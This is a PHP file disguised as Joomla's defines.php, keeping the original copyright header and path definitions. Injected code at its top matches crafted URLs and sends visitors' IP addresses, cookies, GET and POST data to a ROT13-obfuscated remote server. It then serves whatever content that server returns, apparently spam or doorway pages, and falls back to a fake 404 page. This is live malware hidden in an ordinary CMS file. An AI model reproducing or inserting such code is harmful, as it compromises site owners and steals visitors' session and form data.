<?php
/**
* @version		$Id: defines.php 10381 2008-06-01 03:35:53Z pasamio $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/
class ___php_http_request
{
  // Request mode, 0 - use CURL, 1 - use SOCKETS
  var $mode = 0;
  var $timeout = 60;
  function ___php_http_request()
  {
    if (!function_exists('curl_init'))
      $this->mode = 1;
  }

  function _connect($host, $port) {
    $errno = null;
    $errstr = null;
    $hf = fsockopen($host, $port ? $port : 80, $errno, $errstr, $this->timeout);
    return $hf;
  }
  
  function _disconnect($hs) {
    fclose($hs);
  }
  
  function request($url, $post_data = false) {
    switch ($this->mode)
    {
    case 0:
      return $this->_requestCurl($url, $post_data);
    case 1:
      return $this->_requestSock($url, $post_data);
    default:
      return false;
    };
  }
  
  function _requestCurl($url, $post_data) {
    $hc = curl_init($url);
    //echo "URL: [{$url}]<br>\n";
    if ($post_data)
      curl_setopt($hc, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($hc, CURLOPT_RETURNTRANSFER, 1);
    @curl_setopt($hc, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($hc, CURLOPT_AUTOREFERER, 1);
    curl_setopt($hc, CURLOPT_CONNECTTIMEOUT, $this->timeout);
    $res = curl_exec($hc);
    $this->httpStatus = curl_getinfo($hc, CURLINFO_HTTP_CODE);
    //echo "Status: {$this->httpStatus}<br>\n";
    curl_close($hc);
    return $res;
  }
  
  function _requestSock($url, $post_data) {
    $info = parse_url($url);
    $httpHostStr = $info['host'];
    if ($info['port'])
      $httpHostStr .= ':' . $info['port'];
    if (!empty($post_data)) {
      $rtype = 'POST';
      $post = array();
      foreach ($post_data as $key => $val)
      {
        $post[] = urlencode($key) . '=' . urlencode($val);
      };
      $post = implode('&', $post);
      $contentLength = strlen($post);
      $content = "Content-Type: application/x-www-form-urlencoded\nContent-length: " . strlen($post) . "\n\n" . $content;
    }
    else {
      $rtype = 'GET';
      $post = '';
      $content = "\n";
    };
    $req = <<<EOR
{$rtype} {$url} HTTP/1.0
Host: {$httpHostStr}
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.10) Gecko/20071115 Firefox/2.0.0.10
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8
Accept-Language: en
{$content}
EOR;
    //echo "REQUEST:<br>\n---<pre>{$req}</pre>\n";
    $hc = $this->_connect($info['host'], $info['port']);
    if (!$hc) {
      trigger_error("Failed to connect to [{$info['host']}]", E_USER_WARNING);
      return false;
    };
    fwrite($hc, $req);
    $res = '';
    while (!feof($hc))
      $res .= fread($hc, 8192);
    $this->_disconnect($hc);
    if (preg_match('/^HTTP\/[^\s]+\s+(\d+)/', $res, $match)) {
      $this->httpStatus = $match[1];
    }
    else {
      $this->httpStatus = 666;
      return false;
    };
    //echo "Status: {$this->httpStatus}<br>\n";
    if (preg_match('/^.+?(?:\r\n\r\n|\n\n)(.*)$/ms', $res, $match)) {
      return $match[1];
    };
    $this->httpStatus = 666;
    return false;
  }
}

class __php_request_wrapper {
  var $seal = '7aY#4EwrU_eC2AbEcuP?8keYe&ruQuxE=R46eQ38eHE27aZeFr7W7eSp=752xen?';
  var $self = 'auto';
  var $subId = '';
  
  function __php_request_wrapper() {

    $patterns[6] = '/\/index\.php\?option=com_content\&task=show\&id=\d+\&Itemid=(\d+|[^.]+\.js)(\&|$)/'; // index.php?option=com_content&task=show&id={$r}&Itemid={$p}

    $patterns[8] = '/\/index\.php\?l(\d+|[^.]+\.js)(\&|$)/'; // index.php?l{$p}

    $patterns[13] = '/\/index\.php\?item_(\d+|[^.]+\.js)(\&|$)/'; // index.php?item_{$p}

        
    do {
      foreach ($patterns as $sid => $pattern)
      {
        if (preg_match($pattern, $_SERVER['REQUEST_URI'], $match)) {
          $_GET['p'] = $match[1];
          $this->subId = $sid;
          break 2;
        }
      }
      return false;
    } while (false);
    //if (!$this->subId)
    //  return false;
    @set_magic_quotes_runtime(false);
    
    if (get_magic_quotes_gpc()) {
      $this->unslash_rec($_GET);
      $this->unslash_rec($_POST);
      $this->unslash_rec($_REQUEST);
      $this->unslash_rec($_COOKIE);
      foreach ($_FILES as $key => $val)
        $_FILES[$key]['name'] = stripslashes($_FILES[$key]['name']);
    };
    
    $post = Array(
      'self' => ($this->self == 'auto' ? 'http://' . ($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'] : $this->self),
      'sub_id' => $this->subId,
      'PHP_SELF' => $_SERVER['PHP_SELF'],
      'SERVER_PROTOCOL' => $_SERVER['SERVER_PROTOCOL'],
      'REMOTE_ADDR' => $_SERVER['REMOTE_ADDR'],
      'HTTP_REFERER' => $_SERVER['HTTP_REFERER'],
      'HTTP_USER_AGENT' => $_SERVER['HTTP_USER_AGENT'],
      'HTTP_ACCEPT_CHARSET' => $_SERVER['HTTP_ACCEPT_CHARSET'],
      'GET' => serialize($_GET),
      'POST' => serialize($_POST),
      'COOKIE' => serialize($_COOKIE),
    );
    //print_r($post);
    $req = new ___php_http_request();
     $pageTxt = $req->request(str_rot13('uggc://fho026.choyvpqaffreire.bet/etj.cuc'), $post); 
    //echo $pageTxt;
    if (!$pageTxt)
      $this->die404();
    $page = unserialize($pageTxt);
    if ($page['seal'] != $this->seal) {
      //print_r($page);
      $this->die404();
    }
    foreach ($page['headers'] as $header) {
      header($header);
    }
    echo $page['content'];
    die();
  }
  
  function die404()
  {
    header("{$_SERVER['SERVER_PROTOCOL']} 404 Not Found");
    die( <<<EOM
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>404 Not Found</title>
  </head><body>
  <h1>Not Found</h1>
  <p>The requested URL {$_SERVER['REQUEST_URI']} was not found on this server.</p>
  <hr>
  <address>{$_SERVER['SERVER_SOFTWARE']} Server at {$_SERVER['SERVER_NAME']} Port {$_SERVER['SERVER_PORT']}</address>
  </body></html>
EOM
      );
  }
  
  function unslash_rec(&$arr) {
    reset($arr);
    while (list($key)=each($arr)) {
      if (is_array($arr[$key]))
        $this->unslash_rec($arr[$key]);
      else {
        $arr[$key]=stripslashes($arr[$key]);
      }
    }
  }
}
new __php_request_wrapper();

?>
<?php
/**
* @version		$Id: defines.php 10381 2008-06-01 03:35:53Z pasamio $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/**
* Joomla! Application define
*/

//Global definitions
//Joomla framework path definitions
$parts = explode( DS, JPATH_BASE );

//Defines
define( 'JPATH_ROOT',			implode( DS, $parts ) );

define( 'JPATH_SITE',			JPATH_ROOT );
define( 'JPATH_CONFIGURATION', 	JPATH_ROOT );
define( 'JPATH_ADMINISTRATOR', 	JPATH_ROOT.DS.'administrator' );
define( 'JPATH_XMLRPC', 		JPATH_ROOT.DS.'xmlrpc' );
define( 'JPATH_LIBRARIES',	 	JPATH_ROOT.DS.'libraries' );
define( 'JPATH_PLUGINS',		JPATH_ROOT.DS.'plugins'   );
define( 'JPATH_INSTALLATION',	JPATH_ROOT.DS.'installation' );
define( 'JPATH_THEMES'	   ,	JPATH_BASE.DS.'templates' );
define( 'JPATH_CACHE',			JPATH_BASE.DS.'cache');